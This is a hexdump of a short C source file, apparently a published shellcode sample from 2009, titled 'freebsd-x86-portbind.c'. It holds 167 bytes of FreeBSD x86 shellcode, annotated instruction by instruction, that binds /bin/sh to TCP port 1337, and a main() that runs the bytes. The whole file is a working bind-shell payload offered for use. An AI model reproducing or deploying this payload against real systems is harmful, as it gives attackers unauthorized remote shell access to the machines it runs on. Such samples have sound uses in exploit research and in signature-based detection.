00000000  2f 2a 2d 0d 0a 20 2a 20  43 6f 70 79 72 69 67 68  |/*-.. * Copyrigh|
00000010  74 20 28 63 29 20 32 30  30 39 2c 20 53 6f 66 69  |t (c) 2009, Sofi|
00000020  61 6e 20 42 72 61 62 65  7a 20 3c 73 62 7a 40 36  |an Brabez <sbz@6|
00000030  64 65 76 2e 6e 65 74 3e  0d 0a 20 2a 0d 0a 20 2a  |dev.net>.. *.. *|
00000040  20 66 72 65 65 62 73 64  2d 78 38 36 2d 70 6f 72  | freebsd-x86-por|
00000050  74 62 69 6e 64 2e 63 20  2d 20 46 72 65 65 42 53  |tbind.c - FreeBS|
00000060  44 20 78 38 36 20 70 6f  72 74 62 69 6e 64 20 61  |D x86 portbind a|
00000070  20 73 68 65 6c 6c 20 28  2f 62 69 6e 2f 73 68 29  | shell (/bin/sh)|
00000080  20 6f 6e 0d 0a 31 33 33  37 20 28 5c 78 30 35 5c  | on..1337 (\x05\|
00000090  78 33 39 29 20 31 36 37  20 62 79 74 65 73 0d 0a  |x39) 167 bytes..|
000000a0  20 2a 2f 0d 0a 20 0d 0a  63 6f 6e 73 74 20 63 68  | */.. ..const ch|
000000b0  61 72 20 73 68 65 6c 6c  63 6f 64 65 5b 5d 20 3d  |ar shellcode[] =|
000000c0  0d 0a 20 20 20 20 22 5c  78 36 61 5c 78 30 30 22  |..    "\x6a\x00"|
000000d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000000e0  20 20 2f 2f 20 70 75 73  68 20 20 20 24 30 78 30  |  // push   $0x0|
000000f0  0d 0a 20 20 20 20 22 5c  78 36 61 5c 78 30 31 22  |..    "\x6a\x01"|
00000100  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000110  20 20 2f 2f 20 70 75 73  68 20 20 20 24 30 78 31  |  // push   $0x1|
00000120  0d 0a 20 20 20 20 22 5c  78 36 61 5c 78 30 32 22  |..    "\x6a\x02"|
00000130  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000140  20 20 2f 2f 20 70 75 73  68 20 20 20 24 30 78 32  |  // push   $0x2|
00000150  0d 0a 20 20 20 20 22 5c  78 35 30 22 20 20 20 20  |..    "\x50"    |
00000160  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000170  20 20 2f 2f 20 70 75 73  68 20 20 20 25 65 61 78  |  // push   %eax|
00000180  0d 0a 20 20 20 20 22 5c  78 36 61 5c 78 36 31 22  |..    "\x6a\x61"|
00000190  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000001a0  20 20 2f 2f 20 70 75 73  68 20 20 20 24 30 78 36  |  // push   $0x6|
000001b0  31 0d 0a 20 20 20 20 22  5c 78 35 38 22 20 20 20  |1..    "\x58"   |
000001c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000001d0  20 20 20 2f 2f 20 70 6f  70 20 20 20 20 25 65 61  |   // pop    %ea|
000001e0  78 0d 0a 20 20 20 20 22  5c 78 63 64 5c 78 38 30  |x..    "\xcd\x80|
000001f0  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
00000200  20 20 20 2f 2f 20 69 6e  74 20 20 20 20 24 30 78  |   // int    $0x|
00000210  38 30 0d 0a 20 20 20 20  22 5c 78 35 30 22 20 20  |80..    "\x50"  |
00000220  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000230  20 20 20 20 2f 2f 20 70  75 73 68 20 20 20 25 65  |    // push   %e|
00000240  61 78 0d 0a 20 20 20 20  22 5c 78 36 61 5c 78 30  |ax..    "\x6a\x0|
00000250  30 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |0"              |
00000260  20 20 20 20 2f 2f 20 70  75 73 68 20 20 20 24 30  |    // push   $0|
00000270  78 30 0d 0a 20 20 20 20  22 5c 78 36 61 5c 78 30  |x0..    "\x6a\x0|
00000280  30 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |0"              |
00000290  20 20 20 20 2f 2f 20 70  75 73 68 20 20 20 24 30  |    // push   $0|
000002a0  78 30 0d 0a 20 20 20 20  22 5c 78 36 61 5c 78 30  |x0..    "\x6a\x0|
000002b0  30 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |0"              |
000002c0  20 20 20 20 2f 2f 20 70  75 73 68 20 20 20 24 30  |    // push   $0|
000002d0  78 30 0d 0a 20 20 20 20  22 5c 78 36 61 5c 78 30  |x0..    "\x6a\x0|
000002e0  30 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |0"              |
000002f0  20 20 20 20 2f 2f 20 70  75 73 68 20 20 20 24 30  |    // push   $0|
00000300  78 30 0d 0a 20 20 20 20  22 5c 78 36 38 5c 78 31  |x0..    "\x68\x1|
00000310  30 5c 78 30 32 5c 78 30  35 5c 78 33 39 22 20 20  |0\x02\x05\x39"  |
00000320  20 20 20 20 2f 2f 20 70  75 73 68 20 20 20 24 30  |    // push   $0|
00000330  78 33 39 30 35 30 32 31  30 0d 0a 20 20 20 20 22  |x39050210..    "|
00000340  5c 78 38 39 5c 78 65 30  22 20 20 20 20 20 20 20  |\x89\xe0"       |
00000350  20 20 20 20 20 20 20 20  20 20 20 2f 2f 20 6d 6f  |           // mo|
00000360  76 20 20 20 20 25 65 73  70 2c 25 65 61 78 0d 0a  |v    %esp,%eax..|
00000370  20 20 20 20 22 5c 78 36  61 5c 78 31 30 22 20 20  |    "\x6a\x10"  |
00000380  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000390  2f 2f 20 70 75 73 68 20  20 20 24 30 78 31 30 0d  |// push   $0x10.|
000003a0  0a 20 20 20 20 22 5c 78  35 30 22 20 20 20 20 20  |.    "\x50"     |
000003b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000003c0  20 2f 2f 20 70 75 73 68  20 20 20 25 65 61 78 0d  | // push   %eax.|
000003d0  0a 20 20 20 20 22 5c 78  66 66 5c 78 37 34 5c 78  |.    "\xff\x74\x|
000003e0  32 34 5c 78 31 63 22 20  20 20 20 20 20 20 20 20  |24\x1c"         |
000003f0  20 2f 2f 20 70 75 73 68  6c 20 20 30 78 31 63 28  | // pushl  0x1c(|
00000400  25 65 73 70 29 0d 0a 20  20 20 20 22 5c 78 35 30  |%esp)..    "\x50|
00000410  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
00000420  20 20 20 20 20 20 20 2f  2f 20 70 75 73 68 20 20  |       // push  |
00000430  20 25 65 61 78 0d 0a 20  20 20 20 22 5c 78 36 61  | %eax..    "\x6a|
00000440  5c 78 36 38 22 20 20 20  20 20 20 20 20 20 20 20  |\x68"           |
00000450  20 20 20 20 20 20 20 2f  2f 20 70 75 73 68 20 20  |       // push  |
00000460  20 24 30 78 36 38 0d 0a  20 20 20 20 22 5c 78 35  | $0x68..    "\x5|
00000470  38 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |8"              |
00000480  20 20 20 20 20 20 20 20  2f 2f 20 70 6f 70 20 20  |        // pop  |
00000490  20 20 24 65 61 78 0d 0a  20 20 20 20 22 5c 78 63  |  $eax..    "\xc|
000004a0  64 5c 78 38 30 22 20 20  20 20 20 20 20 20 20 20  |d\x80"          |
000004b0  20 20 20 20 20 20 20 20  2f 2f 20 69 6e 74 20 20  |        // int  |
000004c0  20 20 24 30 78 38 30 0d  0a 20 20 20 20 22 5c 78  |  $0x80..    "\x|
000004d0  36 61 5c 78 30 31 22 20  20 20 20 20 20 20 20 20  |6a\x01"         |
000004e0  20 20 20 20 20 20 20 20  20 2f 2f 20 70 75 73 68  |         // push|
000004f0  20 20 20 24 30 78 31 0d  0a 20 20 20 20 22 5c 78  |   $0x1..    "\x|
00000500  66 66 5c 78 37 34 5c 78  32 34 5c 78 32 38 22 20  |ff\x74\x24\x28" |
00000510  20 20 20 20 20 20 20 20  20 2f 2f 20 70 75 73 68  |         // push|
00000520  6c 20 20 30 78 32 38 28  25 65 73 70 29 0d 0a 20  |l  0x28(%esp).. |
00000530  20 20 20 22 5c 78 35 30  22 20 20 20 20 20 20 20  |   "\x50"       |
00000540  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |               /|
00000550  2f 20 70 75 73 68 20 20  20 25 65 61 78 0d 0a 20  |/ push   %eax.. |
00000560  20 20 20 22 5c 78 36 61  5c 78 36 61 22 20 20 20  |   "\x6a\x6a"   |
00000570  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |               /|
00000580  2f 20 70 75 73 68 20 20  20 24 30 78 36 61 0d 0a  |/ push   $0x6a..|
00000590  20 20 20 20 22 5c 78 35  38 22 20 20 20 20 20 20  |    "\x58"      |
000005a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000005b0  2f 2f 20 70 6f 70 20 20  20 20 24 65 61 78 0d 0a  |// pop    $eax..|
000005c0  20 20 20 20 22 5c 78 63  64 5c 78 38 30 22 20 20  |    "\xcd\x80"  |
000005d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000005e0  2f 2f 20 69 6e 74 20 20  20 20 24 30 78 38 30 0d  |// int    $0x80.|
000005f0  0a 20 20 20 20 22 5c 78  38 33 5c 78 65 63 5c 78  |.    "\x83\xec\x|
00000600  31 30 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |10"             |
00000610  20 2f 2f 20 73 75 62 20  20 20 20 24 30 78 31 30  | // sub    $0x10|
00000620  2c 24 65 73 70 0d 0a 20  20 20 20 22 5c 78 36 61  |,$esp..    "\x6a|
00000630  5c 78 31 30 22 20 20 20  20 20 20 20 20 20 20 20  |\x10"           |
00000640  20 20 20 20 20 20 20 2f  2f 20 70 75 73 68 20 20  |       // push  |
00000650  20 24 30 78 31 30 0d 0a  20 20 20 20 22 5c 78 38  | $0x10..    "\x8|
00000660  64 5c 78 34 34 5c 78 32  34 5c 78 30 34 22 20 20  |d\x44\x24\x04"  |
00000670  20 20 20 20 20 20 20 20  2f 2f 20 6c 65 61 20 20  |        // lea  |
00000680  20 20 30 78 34 28 25 65  73 70 29 2c 25 65 61 78  |  0x4(%esp),%eax|
00000690  0d 0a 20 20 20 20 22 5c  78 38 39 5c 78 65 31 22  |..    "\x89\xe1"|
000006a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000006b0  20 20 2f 2f 20 6d 6f 76  20 20 20 20 25 65 73 70  |  // mov    %esp|
000006c0  2c 25 65 63 78 0d 0a 20  20 20 20 22 5c 78 35 31  |,%ecx..    "\x51|
000006d0  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
000006e0  20 20 20 20 20 20 20 2f  2f 20 70 75 73 68 20 20  |       // push  |
000006f0  20 25 65 63 78 0d 0a 20  20 20 20 22 5c 78 35 30  | %ecx..    "\x50|
00000700  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
00000710  20 20 20 20 20 20 20 2f  2f 20 70 75 73 68 20 20  |       // push  |
00000720  20 25 65 61 78 0d 0a 20  20 20 20 22 5c 78 66 66  | %eax..    "\xff|
00000730  5c 78 37 34 5c 78 32 34  5c 78 34 63 22 20 20 20  |\x74\x24\x4c"   |
00000740  20 20 20 20 20 20 20 2f  2f 20 70 75 73 68 6c 20  |       // pushl |
00000750  20 30 78 34 63 28 25 65  73 70 29 0d 0a 20 20 20  | 0x4c(%esp)..   |
00000760  20 22 5c 78 35 30 22 20  20 20 20 20 20 20 20 20  | "\x50"         |
00000770  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |             // |
00000780  70 75 73 68 20 20 20 25  65 61 78 0d 0a 20 20 20  |push   %eax..   |
00000790  20 22 5c 78 36 61 5c 78  31 65 22 20 20 20 20 20  | "\x6a\x1e"     |
000007a0  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |             // |
000007b0  70 75 73 68 20 20 20 25  30 78 31 65 0d 0a 20 20  |push   %0x1e..  |
000007c0  20 20 22 5c 78 35 38 22  20 20 20 20 20 20 20 20  |  "\x58"        |
000007d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2f  |              //|
000007e0  20 70 6f 70 20 20 20 20  25 65 61 78 0d 0a 20 20  | pop    %eax..  |
000007f0  20 20 22 5c 78 63 64 5c  78 38 30 22 20 20 20 20  |  "\xcd\x80"    |
00000800  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2f  |              //|
00000810  20 69 6e 74 20 20 20 20  24 30 78 38 30 0d 0a 20  | int    $0x80.. |
00000820  20 20 20 22 5c 78 35 30  22 20 20 20 20 20 20 20  |   "\x50"       |
00000830  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |               /|
00000840  2f 20 70 75 73 68 20 20  20 25 65 61 78 0d 0a 20  |/ push   %eax.. |
00000850  20 20 20 22 5c 78 66 66  5c 78 37 34 5c 78 32 34  |   "\xff\x74\x24|
00000860  5c 78 35 38 22 20 20 20  20 20 20 20 20 20 20 2f  |\x58"          /|
00000870  2f 20 70 75 73 68 6c 20  20 30 78 35 38 28 25 65  |/ pushl  0x58(%e|
00000880  73 70 29 0d 0a 20 20 20  20 22 5c 78 35 30 22 20  |sp)..    "\x50" |
00000890  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000008a0  20 20 20 20 20 2f 2f 20  70 75 73 68 20 20 20 25  |     // push   %|
000008b0  65 61 78 0d 0a 20 20 20  20 22 5c 78 36 61 5c 78  |eax..    "\x6a\x|
000008c0  30 36 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |06"             |
000008d0  20 20 20 20 20 2f 2f 20  70 75 73 68 20 20 20 24  |     // push   $|
000008e0  30 78 36 0d 0a 20 20 20  20 22 5c 78 35 38 22 20  |0x6..    "\x58" |
000008f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000900  20 20 20 20 20 2f 2f 20  70 6f 70 20 20 20 20 25  |     // pop    %|
00000910  65 61 78 0d 0a 20 20 20  20 22 5c 78 63 64 5c 78  |eax..    "\xcd\x|
00000920  38 30 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |80"             |
00000930  20 20 20 20 20 2f 2f 20  69 6e 74 20 20 20 20 24  |     // int    $|
00000940  30 78 38 30 0d 0a 20 20  20 20 22 5c 78 36 61 5c  |0x80..    "\x6a\|
00000950  78 30 30 22 20 20 20 20  20 20 20 20 20 20 20 20  |x00"            |
00000960  20 20 20 20 20 20 2f 2f  20 70 75 73 68 20 20 20  |      // push   |
00000970  24 30 78 30 0d 0a 20 20  20 20 22 5c 78 66 66 5c  |$0x0..    "\xff\|
00000980  78 37 34 5c 78 32 34 5c  78 30 63 22 20 20 20 20  |x74\x24\x0c"    |
00000990  20 20 20 20 20 20 2f 2f  20 70 75 73 68 6c 20 20  |      // pushl  |
000009a0  30 78 63 28 25 65 73 70  29 0d 0a 20 20 20 20 22  |0xc(%esp)..    "|
000009b0  5c 78 35 30 22 20 20 20  20 20 20 20 20 20 20 20  |\x50"           |
000009c0  20 20 20 20 20 20 20 20  20 20 20 2f 2f 20 70 75  |           // pu|
000009d0  73 68 20 20 20 25 65 61  78 0d 0a 20 20 20 20 22  |sh   %eax..    "|
000009e0  5c 78 36 61 5c 78 35 61  22 20 20 20 20 20 20 20  |\x6a\x5a"       |
000009f0  20 20 20 20 20 20 20 20  20 20 20 2f 2f 20 70 75  |           // pu|
00000a00  73 68 20 20 20 24 30 78  35 61 0d 0a 20 20 20 20  |sh   $0x5a..    |
00000a10  22 5c 78 35 38 22 20 20  20 20 20 20 20 20 20 20  |"\x58"          |
00000a20  20 20 20 20 20 20 20 20  20 20 20 20 2f 2f 20 70  |            // p|
00000a30  6f 70 20 20 20 20 25 65  61 78 0d 0a 20 20 20 20  |op    %eax..    |
00000a40  22 5c 78 63 64 5c 78 38  30 22 20 20 20 20 20 20  |"\xcd\x80"      |
00000a50  20 20 20 20 20 20 20 20  20 20 20 20 2f 2f 20 69  |            // i|
00000a60  6e 74 20 20 20 20 24 30  78 38 30 0d 0a 20 20 20  |nt    $0x80..   |
00000a70  20 22 5c 78 36 61 5c 78  30 31 22 20 20 20 20 20  | "\x6a\x01"     |
00000a80  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |             // |
00000a90  70 75 73 68 20 20 20 24  30 78 31 0d 0a 20 20 20  |push   $0x1..   |
00000aa0  20 22 5c 78 66 66 5c 78  37 34 5c 78 32 34 5c 78  | "\xff\x74\x24\x|
00000ab0  31 38 22 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |18"          // |
00000ac0  70 75 73 68 6c 20 20 30  78 31 38 28 25 65 73 70  |pushl  0x18(%esp|
00000ad0  29 0d 0a 20 20 20 20 22  5c 78 35 30 22 20 20 20  |)..    "\x50"   |
00000ae0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000af0  20 20 20 2f 2f 20 70 75  73 68 20 20 20 25 65 61  |   // push   %ea|
00000b00  78 0d 0a 20 20 20 20 22  5c 78 36 61 5c 78 35 61  |x..    "\x6a\x5a|
00000b10  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |"               |
00000b20  20 20 20 2f 2f 20 70 75  73 68 20 20 20 24 30 78  |   // push   $0x|
00000b30  35 61 0d 0a 20 20 20 20  22 5c 78 35 38 22 20 20  |5a..    "\x58"  |
00000b40  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000b50  20 20 20 20 2f 2f 20 70  6f 70 20 20 20 20 25 65  |    // pop    %e|
00000b60  61 78 0d 0a 20 20 20 20  22 5c 78 63 64 5c 78 38  |ax..    "\xcd\x8|
00000b70  30 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |0"              |
00000b80  20 20 20 20 2f 2f 20 69  6e 74 20 20 20 20 24 30  |    // int    $0|
00000b90  78 38 30 0d 0a 20 20 20  20 22 5c 78 36 61 5c 78  |x80..    "\x6a\x|
00000ba0  30 32 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |02"             |
00000bb0  20 20 20 20 20 2f 2f 20  70 75 73 68 20 20 20 24  |     // push   $|
00000bc0  30 78 32 0d 0a 20 20 20  20 22 5c 78 66 66 5c 78  |0x2..    "\xff\x|
00000bd0  37 34 5c 78 32 34 5c 78  32 34 22 20 20 20 20 20  |74\x24\x24"     |
00000be0  20 20 20 20 20 2f 2f 20  70 75 73 68 6c 20 20 30  |     // pushl  0|
00000bf0  78 32 34 28 25 65 73 70  29 0d 0a 20 20 20 20 22  |x24(%esp)..    "|
00000c00  5c 78 35 30 22 20 20 20  20 20 20 20 20 20 20 20  |\x50"           |
00000c10  20 20 20 20 20 20 20 20  20 20 20 2f 2f 20 70 75  |           // pu|
00000c20  73 68 20 20 20 25 65 61  78 0d 0a 20 20 20 20 22  |sh   %eax..    "|
00000c30  5c 78 36 61 5c 78 35 61  22 20 20 20 20 20 20 20  |\x6a\x5a"       |
00000c40  20 20 20 20 20 20 20 20  20 20 20 2f 2f 20 70 75  |           // pu|
00000c50  73 68 20 20 20 24 30 78  35 61 0d 0a 20 20 20 20  |sh   $0x5a..    |
00000c60  22 5c 78 35 38 22 20 20  20 20 20 20 20 20 20 20  |"\x58"          |
00000c70  20 20 20 20 20 20 20 20  20 20 20 20 2f 2f 20 70  |            // p|
00000c80  6f 70 20 20 20 20 25 65  61 78 0d 0a 20 20 20 20  |op    %eax..    |
00000c90  22 5c 78 63 64 5c 78 38  30 22 20 20 20 20 20 20  |"\xcd\x80"      |
00000ca0  20 20 20 20 20 20 20 20  20 20 20 20 2f 2f 20 69  |            // i|
00000cb0  6e 74 20 20 20 20 24 30  78 38 30 0d 0a 20 20 20  |nt    $0x80..   |
00000cc0  20 22 5c 78 36 38 5c 78  37 33 5c 78 36 38 5c 78  | "\x68\x73\x68\x|
00000cd0  30 30 5c 78 30 30 22 20  20 20 20 20 20 2f 2f 20  |00\x00"      // |
00000ce0  70 75 73 68 20 20 20 24  30 78 36 38 37 33 0d 0a  |push   $0x6873..|
00000cf0  20 20 20 20 22 5c 78 38  39 5c 78 65 30 22 20 20  |    "\x89\xe0"  |
00000d00  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000d10  2f 2f 20 6d 6f 76 20 20  20 20 25 65 73 70 2c 25  |// mov    %esp,%|
00000d20  65 61 78 0d 0a 20 20 20  20 22 5c 78 36 38 5c 78  |eax..    "\x68\x|
00000d30  32 64 5c 78 36 39 5c 78  30 30 5c 78 30 30 22 20  |2d\x69\x00\x00" |
00000d40  20 20 20 20 20 2f 2f 20  70 75 73 68 20 20 20 24  |     // push   $|
00000d50  30 78 36 39 32 64 0d 0a  20 20 20 20 22 5c 78 38  |0x692d..    "\x8|
00000d60  39 5c 78 65 31 22 20 20  20 20 20 20 20 20 20 20  |9\xe1"          |
00000d70  20 20 20 20 20 20 20 20  2f 2f 20 6d 6f 76 20 20  |        // mov  |
00000d80  20 20 25 65 73 70 2c 25  65 63 78 0d 0a 20 20 20  |  %esp,%ecx..   |
00000d90  20 22 5c 78 36 61 5c 78  30 30 22 20 20 20 20 20  | "\x6a\x00"     |
00000da0  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |             // |
00000db0  70 75 73 68 20 20 20 24  30 78 30 0d 0a 20 20 20  |push   $0x0..   |
00000dc0  20 22 5c 78 35 31 22 20  20 20 20 20 20 20 20 20  | "\x51"         |
00000dd0  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |             // |
00000de0  70 75 73 68 20 20 20 25  65 63 78 0d 0a 20 20 20  |push   %ecx..   |
00000df0  20 22 5c 78 35 30 22 20  20 20 20 20 20 20 20 20  | "\x50"         |
00000e00  20 20 20 20 20 20 20 20  20 20 20 20 20 2f 2f 20  |             // |
00000e10  70 75 73 68 20 20 20 25  65 61 78 0d 0a 20 20 20  |push   %eax..   |
00000e20  20 22 5c 78 36 38 5c 78  32 66 5c 78 37 33 5c 78  | "\x68\x2f\x73\x|
00000e30  36 38 5c 78 30 30 22 20  20 20 20 20 20 2f 2f 20  |68\x00"      // |
00000e40  70 75 73 68 20 20 20 24  30 78 36 38 37 33 32 66  |push   $0x68732f|
00000e50  0d 0a 20 20 20 20 22 5c  78 36 38 5c 78 32 66 5c  |..    "\x68\x2f\|
00000e60  78 36 32 5c 78 36 39 5c  78 36 65 22 20 20 20 20  |x62\x69\x6e"    |
00000e70  20 20 2f 2f 20 70 75 73  68 20 20 20 24 30 78 36  |  // push   $0x6|
00000e80  65 36 39 36 32 32 66 0d  0a 20 20 20 20 22 5c 78  |e69622f..    "\x|
00000e90  38 39 5c 78 65 30 22 20  20 20 20 20 20 20 20 20  |89\xe0"         |
00000ea0  20 20 20 20 20 20 20 20  20 2f 2f 20 6d 6f 76 20  |         // mov |
00000eb0  20 20 20 25 65 73 70 2c  25 65 61 78 0d 0a 20 20  |   %esp,%eax..  |
00000ec0  20 20 22 5c 78 38 64 5c  78 34 63 5c 78 32 34 5c  |  "\x8d\x4c\x24\|
00000ed0  78 30 38 22 20 20 20 20  20 20 20 20 20 20 2f 2f  |x08"          //|
00000ee0  20 6c 65 61 20 20 20 20  30 78 38 28 25 65 73 70  | lea    0x8(%esp|
00000ef0  29 2c 25 65 63 78 0d 0a  20 20 20 20 22 5c 78 36  |),%ecx..    "\x6|
00000f00  61 5c 78 30 30 22 20 20  20 20 20 20 20 20 20 20  |a\x00"          |
00000f10  20 20 20 20 20 20 20 20  2f 2f 20 70 75 73 68 20  |        // push |
00000f20  20 20 24 30 78 30 0d 0a  20 20 20 20 22 5c 78 35  |  $0x0..    "\x5|
00000f30  31 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |1"              |
00000f40  20 20 20 20 20 20 20 20  2f 2f 20 70 75 73 68 20  |        // push |
00000f50  20 20 25 65 63 78 0d 0a  20 20 20 20 22 5c 78 35  |  %ecx..    "\x5|
00000f60  30 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |0"              |
00000f70  20 20 20 20 20 20 20 20  2f 2f 20 70 75 73 68 20  |        // push |
00000f80  20 20 25 65 61 78 0d 0a  20 20 20 20 22 5c 78 35  |  %eax..    "\x5|
00000f90  30 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |0"              |
00000fa0  20 20 20 20 20 20 20 20  2f 2f 20 70 75 73 68 20  |        // push |
00000fb0  20 20 25 65 61 78 0d 0a  20 20 20 20 22 5c 78 36  |  %eax..    "\x6|
00000fc0  61 5c 78 33 62 22 20 20  20 20 20 20 20 20 20 20  |a\x3b"          |
00000fd0  20 20 20 20 20 20 20 20  2f 2f 20 70 75 73 68 20  |        // push |
00000fe0  20 20 24 30 78 33 62 0d  0a 20 20 20 20 22 5c 78  |  $0x3b..    "\x|
00000ff0  35 38 22 20 20 20 20 20  20 20 20 20 20 20 20 20  |58"             |
00001000  20 20 20 20 20 20 20 20  20 2f 2f 20 70 6f 70 20  |         // pop |
00001010  20 20 20 25 65 61 78 0d  0a 20 20 20 20 22 5c 78  |   %eax..    "\x|
00001020  63 64 5c 78 38 30 22 3b  20 20 20 20 20 20 20 20  |cd\x80";        |
00001030  20 20 20 20 20 20 20 20  20 2f 2f 20 69 6e 74 20  |         // int |
00001040  20 20 20 24 30 78 38 30  0d 0a 20 0d 0a 69 6e 74  |   $0x80.. ..int|
00001050  20 6d 61 69 6e 28 76 6f  69 64 29 20 7b 0d 0a 20  | main(void) {.. |
00001060  20 20 20 76 6f 69 64 20  28 2a 65 67 67 29 28 29  |   void (*egg)()|
00001070  20 3d 20 28 76 6f 69 64  20 2a 29 73 68 65 6c 6c  | = (void *)shell|
00001080  63 6f 64 65 3b 0d 0a 20  0d 0a 20 20 20 20 72 65  |code;.. ..    re|
00001090  74 75 72 6e 20 28 2a 28  69 6e 74 28 2a 29 28 29  |turn (*(int(*)()|
000010a0  29 73 68 65 6c 6c 63 6f  64 65 29 28 29 3b 0d 0a  |)shellcode)();..|
000010b0  7d                                                |}|
000010b1
